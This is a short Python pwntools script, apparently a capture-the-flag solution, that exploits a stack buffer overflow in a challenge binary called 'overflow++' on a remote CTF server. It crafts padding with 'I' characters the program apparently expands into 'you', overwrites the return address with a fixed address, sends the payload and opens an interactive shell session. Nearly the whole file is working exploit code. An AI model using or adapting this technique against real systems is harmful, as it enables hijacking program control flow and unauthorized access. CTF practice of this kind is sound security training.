from pwn import *
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

p=remote('cssc.vul337.team',49322)
# p=process("./overflow++")


import struct

def float2byte(num):
    return struct.pack('<f',num)

print(float2byte(11.28125))

print(len(float2byte(11.28125)))

returnaddress=0x8048f0d

# payload=b'a'*(0x30-4)+float2byte(11.28125)

payload=3*b'a'+19*b'I'+b'a'*4+p32(returnaddress)

# 32-8=24个字节
# 前面部分24byte变成3C个byte（也就是60个byte）
# 后面部分正好填上返回地址

# p.sendafter("Let's guess the number.\n",payload)
# p.interactive()

# replace就是把I变成you

p.sendline(payload)

# p.sendafter("Tell me something about yourself:",payload)

p.interactive()